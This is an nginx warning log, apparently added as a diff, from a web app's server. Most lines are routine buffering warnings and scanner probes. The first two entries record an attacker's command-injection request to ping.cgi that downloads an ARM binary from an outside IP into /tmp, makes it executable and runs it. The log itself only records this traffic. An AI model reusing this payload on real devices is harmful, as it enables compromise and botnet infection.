+2026/04/22 23:41:05 [warn] 30873#30873: *382 using uninitialized "day" variable while logging request, client: 179.6.101.90, server: , request: "GET /ping.cgi?pingIpAddress=google.fr;wget%20http://37.48.254.120/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7%27/&sessionKey=1039 HTTP/1.1"
+2026/04/22 23:41:05 [warn] 30873#30873: *382 using uninitialized "hour" variable while logging request, client: 179.6.101.90, server: , request: "GET /ping.cgi?pingIpAddress=google.fr;wget%20http://37.48.254.120/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7%27/&sessionKey=1039 HTTP/1.1"
+2026/04/23 00:43:41 [warn] 30873#30873: *393 using uninitialized "year" variable while logging request, client: 45.135.194.20, server: , request: "CONNECT google.com:443 HTTP/1.1"
+2026/04/23 00:43:41 [warn] 30873#30873: *393 using uninitialized "month" variable while logging request, client: 45.135.194.20, server: , request: "CONNECT google.com:443 HTTP/1.1"
+2026/04/23 00:43:41 [warn] 30873#30873: *393 using uninitialized "day" variable while logging request, client: 45.135.194.20, server: , request: "CONNECT google.com:443 HTTP/1.1"
+2026/04/23 00:43:41 [warn] 30873#30873: *393 using uninitialized "hour" variable while logging request, client: 45.135.194.20, server: , request: "CONNECT google.com:443 HTTP/1.1"
+2026/04/23 02:58:52 [warn] 30872#30872: *409 using uninitialized "year" variable while logging request, client: 172.239.117.241, server: , request: "  üÔ6Ÿè¾ !ñgÁ¶g^1>•&gQ5]Nå§ YdÖ=˜ Tj—'kyoœ%YB¢’,:vq+Êp×ë#fPúÝ:ž >À,À0 ŸÌ©Ì¨ÌªÀ+À/ žÀ$À( kÀ#À' gÀ"
+2026/04/23 02:58:52 [warn] 30872#30872: *409 using uninitialized "month" variable while logging request, client: 172.239.117.241, server: , request: "  üÔ6Ÿè¾ !ñgÁ¶g^1>•&gQ5]Nå§ YdÖ=˜ Tj—'kyoœ%YB¢’,:vq+Êp×ë#fPúÝ:ž >À,À0 ŸÌ©Ì¨ÌªÀ+À/ žÀ$À( kÀ#À' gÀ"
+2026/04/23 02:58:52 [warn] 30872#30872: *409 using uninitialized "day" variable while logging request, client: 172.239.117.241, server: , request: "  üÔ6Ÿè¾ !ñgÁ¶g^1>•&gQ5]Nå§ YdÖ=˜ Tj—'kyoœ%YB¢’,:vq+Êp×ë#fPúÝ:ž >À,À0 ŸÌ©Ì¨ÌªÀ+À/ žÀ$À( kÀ#À' gÀ"
+2026/04/23 02:58:52 [warn] 30872#30872: *409 using uninitialized "hour" variable while logging request, client: 172.239.117.241, server: , request: "  üÔ6Ÿè¾ !ñgÁ¶g^1>•&gQ5]Nå§ YdÖ=˜ Tj—'kyoœ%YB¢’,:vq+Êp×ë#fPúÝ:ž >À,À0 ŸÌ©Ì¨ÌªÀ+À/ žÀ$À( kÀ#À' gÀ"
+2026/04/23 04:31:00 [warn] 30872#30872: *424 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/5/00/0000000005 while reading upstream, client: 222.107.157.9, server: , request: "GET /static/js/main.fc8cb9e9.js HTTP/1.1", upstream: "http://127.0.0.1:8000/static/js/main.fc8cb9e9.js", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 04:31:10 [warn] 30872#30872: *432 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/6/00/0000000006 while reading upstream, client: 222.107.157.9, server: , request: "GET /static/js/main.fc8cb9e9.js HTTP/1.1", upstream: "http://127.0.0.1:8000/static/js/main.fc8cb9e9.js", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 04:31:16 [warn] 30872#30872: *424 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/7/00/0000000007 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/ublox/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/ublox/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 04:31:33 [warn] 30872#30872: *432 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/8/00/0000000008 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/ublox/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/ublox/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 04:31:54 [warn] 30872#30872: *424 a client request body is buffered to a temporary file /var/lib/nginx/tmp/client_body/0000000009, client: 222.107.157.9, server: , request: "POST /api/invoice-batch/preview HTTP/1.1", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 04:33:14 [warn] 30872#30872: *448 using uninitialized "year" variable while logging request, client: 198.235.24.26, server: , request: " Ê  Æ×FÃô9äÆ<oMl…˜}Ÿs^¡fI_¦‘èI	"
+2026/04/23 04:33:14 [warn] 30872#30872: *448 using uninitialized "month" variable while logging request, client: 198.235.24.26, server: , request: " Ê  Æ×FÃô9äÆ<oMl…˜}Ÿs^¡fI_¦‘èI	"
+2026/04/23 04:33:14 [warn] 30872#30872: *448 using uninitialized "day" variable while logging request, client: 198.235.24.26, server: , request: " Ê  Æ×FÃô9äÆ<oMl…˜}Ÿs^¡fI_¦‘èI	"
+2026/04/23 04:33:14 [warn] 30872#30872: *448 using uninitialized "hour" variable while logging request, client: 198.235.24.26, server: , request: " Ê  Æ×FÃô9äÆ<oMl…˜}Ÿs^¡fI_¦‘èI	"
+2026/04/23 04:33:14 [warn] 30872#30872: *447 using uninitialized "year" variable while logging request, client: 198.235.24.26, server: , request: " î  êÓó-F²¾ED8öM¨`‘ñë]zÚåI6ß7€àV~ è æåà]â}V©¢<ÛiJ³ZÚ†œ¨ðŒŸ6Ó &À+À/À,À0Ì©Ì¨À	ÀÀ"
+2026/04/23 04:33:14 [warn] 30872#30872: *447 using uninitialized "month" variable while logging request, client: 198.235.24.26, server: , request: " î  êÓó-F²¾ED8öM¨`‘ñë]zÚåI6ß7€àV~ è æåà]â}V©¢<ÛiJ³ZÚ†œ¨ðŒŸ6Ó &À+À/À,À0Ì©Ì¨À	ÀÀ"
+2026/04/23 04:33:14 [warn] 30872#30872: *447 using uninitialized "day" variable while logging request, client: 198.235.24.26, server: , request: " î  êÓó-F²¾ED8öM¨`‘ñë]zÚåI6ß7€àV~ è æåà]â}V©¢<ÛiJ³ZÚ†œ¨ðŒŸ6Ó &À+À/À,À0Ì©Ì¨À	ÀÀ"
+2026/04/23 04:33:14 [warn] 30872#30872: *447 using uninitialized "hour" variable while logging request, client: 198.235.24.26, server: , request: " î  êÓó-F²¾ED8öM¨`‘ñë]zÚåI6ß7€àV~ è æåà]â}V©¢<ÛiJ³ZÚ†œ¨ðŒŸ6Ó &À+À/À,À0Ì©Ì¨À	ÀÀ"
+2026/04/23 04:50:27 [warn] 30873#30873: *455 using uninitialized "year" variable while logging request, client: 93.174.93.12, server: , request: "o kRHÅ#÷:Nßâ´‚/ÿ	TŸ§Äy°hÆŒ¤="á˜ „´,…¯nãY»bhlÿ(=':©‚ÙoÈ¢×“˜´ï€å¹ (À"
+2026/04/23 04:50:27 [warn] 30873#30873: *455 using uninitialized "month" variable while logging request, client: 93.174.93.12, server: , request: "o kRHÅ#÷:Nßâ´‚/ÿ	TŸ§Äy°hÆŒ¤="á˜ „´,…¯nãY»bhlÿ(=':©‚ÙoÈ¢×“˜´ï€å¹ (À"
+2026/04/23 04:50:27 [warn] 30873#30873: *455 using uninitialized "day" variable while logging request, client: 93.174.93.12, server: , request: "o kRHÅ#÷:Nßâ´‚/ÿ	TŸ§Äy°hÆŒ¤="á˜ „´,…¯nãY»bhlÿ(=':©‚ÙoÈ¢×“˜´ï€å¹ (À"
+2026/04/23 04:50:27 [warn] 30873#30873: *455 using uninitialized "hour" variable while logging request, client: 93.174.93.12, server: , request: "o kRHÅ#÷:Nßâ´‚/ÿ	TŸ§Äy°hÆŒ¤="á˜ „´,…¯nãY»bhlÿ(=':©‚ÙoÈ¢×“˜´ï€å¹ (À"
+2026/04/23 04:50:58 [warn] 30873#30873: *463 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/0/01/0000000010 while reading upstream, client: 211.234.206.230, server: , request: "GET /static/js/main.fc8cb9e9.js HTTP/1.1", upstream: "http://127.0.0.1:8000/static/js/main.fc8cb9e9.js", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 04:53:33 [warn] 30873#30873: *471 a client request body is buffered to a temporary file /var/lib/nginx/tmp/client_body/0000000011, client: 211.234.206.230, server: , request: "POST /api/export HTTP/1.1", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 04:54:09 [warn] 30872#30872: *476 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/2/01/0000000012 while reading upstream, client: 211.234.206.230, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 05:02:26 [warn] 30872#30872: *480 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/3/01/0000000013 while reading upstream, client: 222.107.157.9, server: , request: "GET /static/js/main.fc8cb9e9.js HTTP/1.1", upstream: "http://127.0.0.1:8000/static/js/main.fc8cb9e9.js", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 05:02:43 [warn] 30872#30872: *480 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/4/01/0000000014 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 05:02:50 [warn] 30872#30872: *480 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/5/01/0000000015 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/ublox/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/ublox/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 05:02:56 [warn] 30872#30872: *480 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/6/01/0000000016 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 05:03:13 [warn] 30872#30872: *480 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/7/01/0000000017 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/ublox/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/ublox/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 05:03:19 [warn] 30872#30872: *480 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/8/01/0000000018 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 05:14:50 [warn] 30872#30872: *500 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/9/01/0000000019 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 05:17:20 [warn] 30872#30872: *506 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/0/02/0000000020 while reading upstream, client: 222.107.157.9, server: , request: "POST /api/invoice/generate HTTP/1.1", upstream: "http://127.0.0.1:8000/api/invoice/generate", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 05:20:05 [warn] 30872#30872: *514 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/1/02/0000000021 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 05:24:18 [warn] 30872#30872: *527 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/2/02/0000000022 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 05:24:43 [warn] 30872#30872: *527 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/3/02/0000000023 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 05:38:27 [warn] 30873#30873: *537 using uninitialized "year" variable while logging request, client: 185.242.226.113, server: , request: " ‹  ‡pâ¦?%Œé~¨|…È]&Ù“Œ"
+2026/04/23 05:38:27 [warn] 30873#30873: *537 using uninitialized "month" variable while logging request, client: 185.242.226.113, server: , request: " ‹  ‡pâ¦?%Œé~¨|…È]&Ù“Œ"
+2026/04/23 05:38:27 [warn] 30873#30873: *537 using uninitialized "day" variable while logging request, client: 185.242.226.113, server: , request: " ‹  ‡pâ¦?%Œé~¨|…È]&Ù“Œ"
+2026/04/23 05:38:27 [warn] 30873#30873: *537 using uninitialized "hour" variable while logging request, client: 185.242.226.113, server: , request: " ‹  ‡pâ¦?%Œé~¨|…È]&Ù“Œ"
+2026/04/23 05:47:30 [warn] 64963#64963: could not build optimal types_hash, you should increase either types_hash_max_size: 1024 or types_hash_bucket_size: 64; ignoring types_hash_bucket_size
+2026/04/23 05:47:31 [warn] 64996#64996: could not build optimal types_hash, you should increase either types_hash_max_size: 1024 or types_hash_bucket_size: 64; ignoring types_hash_bucket_size
+2026/04/23 05:47:31 [warn] 64997#64997: could not build optimal types_hash, you should increase either types_hash_max_size: 1024 or types_hash_bucket_size: 64; ignoring types_hash_bucket_size
+2026/04/23 05:48:22 [warn] 65000#65000: *1 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/1/00/0000000001 while reading upstream, client: 222.107.157.9, server: , request: "GET /static/js/main.2144f5b6.js HTTP/1.1", upstream: "http://127.0.0.1:8000/static/js/main.2144f5b6.js", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 05:48:33 [warn] 65000#65000: *1 a client request body is buffered to a temporary file /var/lib/nginx/tmp/client_body/0000000002, client: 222.107.157.9, server: , request: "POST /api/invoice-batch/preview HTTP/1.1", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 05:51:47 [warn] 65000#65000: *19 a client request body is buffered to a temporary file /var/lib/nginx/tmp/client_body/0000000003, client: 222.107.157.9, server: , request: "POST /api/invoice-batch/preview HTTP/1.1", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 06:07:07 [warn] 65000#65000: *30 using uninitialized "year" variable while logging request, client: 66.132.172.139, server: , request: "PRI * HTTP/2.0"
+2026/04/23 06:07:07 [warn] 65000#65000: *30 using uninitialized "month" variable while logging request, client: 66.132.172.139, server: , request: "PRI * HTTP/2.0"
+2026/04/23 06:07:07 [warn] 65000#65000: *30 using uninitialized "day" variable while logging request, client: 66.132.172.139, server: , request: "PRI * HTTP/2.0"
+2026/04/23 06:07:07 [warn] 65000#65000: *30 using uninitialized "hour" variable while logging request, client: 66.132.172.139, server: , request: "PRI * HTTP/2.0"
+2026/04/23 06:07:10 [warn] 65000#65000: *27 using uninitialized "year" variable while logging request, client: 66.132.172.139, server: , request: " î  ê€Æö,áÃí¼À<0	0ó~O´Lê•;$Ï¤ç h¤I ?àŸäºz¿Q’ÃnGŒº'ßêy8ÂZ!Ðr‘˜L &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ"
+2026/04/23 06:07:10 [warn] 65000#65000: *27 using uninitialized "month" variable while logging request, client: 66.132.172.139, server: , request: " î  ê€Æö,áÃí¼À<0	0ó~O´Lê•;$Ï¤ç h¤I ?àŸäºz¿Q’ÃnGŒº'ßêy8ÂZ!Ðr‘˜L &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ"
+2026/04/23 06:07:10 [warn] 65000#65000: *27 using uninitialized "day" variable while logging request, client: 66.132.172.139, server: , request: " î  ê€Æö,áÃí¼À<0	0ó~O´Lê•;$Ï¤ç h¤I ?àŸäºz¿Q’ÃnGŒº'ßêy8ÂZ!Ðr‘˜L &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ"
+2026/04/23 06:07:10 [warn] 65000#65000: *27 using uninitialized "hour" variable while logging request, client: 66.132.172.139, server: , request: " î  ê€Æö,áÃí¼À<0	0ó~O´Lê•;$Ï¤ç h¤I ?àŸäºz¿Q’ÃnGŒº'ßêy8ÂZ!Ðr‘˜L &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ"
+2026/04/23 06:07:15 [warn] 65000#65000: *35 using uninitialized "year" variable while logging request, client: 66.132.172.139, server: , request: " î  ê}—êÝIÕèWF.\ € Š[buÝÒ}˜¬6$² Þ¶‰oc,à+‡lðòÂŠ‰‘!!Ûªßy0 § &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ"
+2026/04/23 06:07:15 [warn] 65000#65000: *35 using uninitialized "month" variable while logging request, client: 66.132.172.139, server: , request: " î  ê}—êÝIÕèWF.\ € Š[buÝÒ}˜¬6$² Þ¶‰oc,à+‡lðòÂŠ‰‘!!Ûªßy0 § &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ"
+2026/04/23 06:07:15 [warn] 65000#65000: *35 using uninitialized "day" variable while logging request, client: 66.132.172.139, server: , request: " î  ê}—êÝIÕèWF.\ € Š[buÝÒ}˜¬6$² Þ¶‰oc,à+‡lðòÂŠ‰‘!!Ûªßy0 § &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ"
+2026/04/23 06:07:15 [warn] 65000#65000: *35 using uninitialized "hour" variable while logging request, client: 66.132.172.139, server: , request: " î  ê}—êÝIÕèWF.\ € Š[buÝÒ}˜¬6$² Þ¶‰oc,à+‡lðòÂŠ‰‘!!Ûªßy0 § &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ"
+2026/04/23 06:07:17 [warn] 64999#64999: *38 using uninitialized "year" variable while logging request, client: 66.132.172.139, server: , request: " î  êÙÁí^7rû³!xrIaÈÒ"º—›ÔØÚ°uî x Açç\¸xâî=¸3Ç¹§hË5hd!G`*,ˆåŸ &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ"
+2026/04/23 06:07:17 [warn] 64999#64999: *38 using uninitialized "month" variable while logging request, client: 66.132.172.139, server: , request: " î  êÙÁí^7rû³!xrIaÈÒ"º—›ÔØÚ°uî x Açç\¸xâî=¸3Ç¹§hË5hd!G`*,ˆåŸ &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ"
+2026/04/23 06:07:17 [warn] 64999#64999: *38 using uninitialized "day" variable while logging request, client: 66.132.172.139, server: , request: " î  êÙÁí^7rû³!xrIaÈÒ"º—›ÔØÚ°uî x Açç\¸xâî=¸3Ç¹§hË5hd!G`*,ˆåŸ &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ"
+2026/04/23 06:07:17 [warn] 64999#64999: *38 using uninitialized "hour" variable while logging request, client: 66.132.172.139, server: , request: " î  êÙÁí^7rû³!xrIaÈÒ"º—›ÔØÚ°uî x Açç\¸xâî=¸3Ç¹§hË5hd!G`*,ˆåŸ &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ"
+2026/04/23 06:18:37 [warn] 64999#64999: *48 using uninitialized "year" variable while logging request, client: 45.140.222.140, server: , request: "   üY·MçÙÚGîè¾õÍ1`×:ü­ö`ã­œCýÒ‚ÜÊ $ÑU˜õ*H^W=æÈ˜ê>1`ìXæh2L¦QHË_†h &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ"
+2026/04/23 06:18:37 [warn] 64999#64999: *48 using uninitialized "month" variable while logging request, client: 45.140.222.140, server: , request: "   üY·MçÙÚGîè¾õÍ1`×:ü­ö`ã­œCýÒ‚ÜÊ $ÑU˜õ*H^W=æÈ˜ê>1`ìXæh2L¦QHË_†h &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ"
+2026/04/23 06:18:37 [warn] 64999#64999: *48 using uninitialized "day" variable while logging request, client: 45.140.222.140, server: , request: "   üY·MçÙÚGîè¾õÍ1`×:ü­ö`ã­œCýÒ‚ÜÊ $ÑU˜õ*H^W=æÈ˜ê>1`ìXæh2L¦QHË_†h &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ"
+2026/04/23 06:18:37 [warn] 64999#64999: *48 using uninitialized "hour" variable while logging request, client: 45.140.222.140, server: , request: "   üY·MçÙÚGîè¾õÍ1`×:ü­ö`ã­œCýÒ‚ÜÊ $ÑU˜õ*H^W=æÈ˜ê>1`ìXæh2L¦QHË_†h &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ"
+2026/04/23 06:41:44 [warn] 64999#64999: *63 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/4/00/0000000004 while reading upstream, client: 222.107.157.9, server: , request: "GET /static/js/main.2144f5b6.js HTTP/1.1", upstream: "http://127.0.0.1:8000/static/js/main.2144f5b6.js", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 06:41:55 [warn] 64999#64999: *63 a client request body is buffered to a temporary file /var/lib/nginx/tmp/client_body/0000000005, client: 222.107.157.9, server: , request: "POST /api/invoice-batch/preview HTTP/1.1", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 06:43:06 [warn] 64999#64999: *63 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/6/00/0000000006 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 06:47:22 [warn] 65000#65000: *81 a client request body is buffered to a temporary file /var/lib/nginx/tmp/client_body/0000000007, client: 222.107.157.9, server: , request: "POST /api/invoice-batch/preview HTTP/1.1", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 06:47:27 [warn] 65000#65000: *79 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/8/00/0000000008 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 06:47:30 [warn] 65000#65000: *79 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/9/00/0000000009 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 06:50:26 [warn] 65000#65000: *87 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/0/01/0000000010 while reading upstream, client: 59.9.178.113, server: , request: "GET /static/js/main.2144f5b6.js HTTP/1.1", upstream: "http://127.0.0.1:8000/static/js/main.2144f5b6.js", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 06:50:39 [warn] 65000#65000: *87 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/1/01/0000000011 while reading upstream, client: 59.9.178.113, server: , request: "GET /api/ublox/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/ublox/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 06:51:24 [warn] 65000#65000: *87 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/2/01/0000000012 while reading upstream, client: 59.9.178.113, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 06:51:56 [warn] 65000#65000: *99 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/3/01/0000000013 while reading upstream, client: 222.107.157.9, server: , request: "GET /static/js/main.2144f5b6.js HTTP/1.1", upstream: "http://127.0.0.1:8000/static/js/main.2144f5b6.js", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 06:53:16 [warn] 65000#65000: *107 a client request body is buffered to a temporary file /var/lib/nginx/tmp/client_body/0000000014, client: 222.107.157.9, server: , request: "POST /api/invoice-batch/preview HTTP/1.1", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 06:56:33 [warn] 64999#64999: *118 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/5/01/0000000015 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
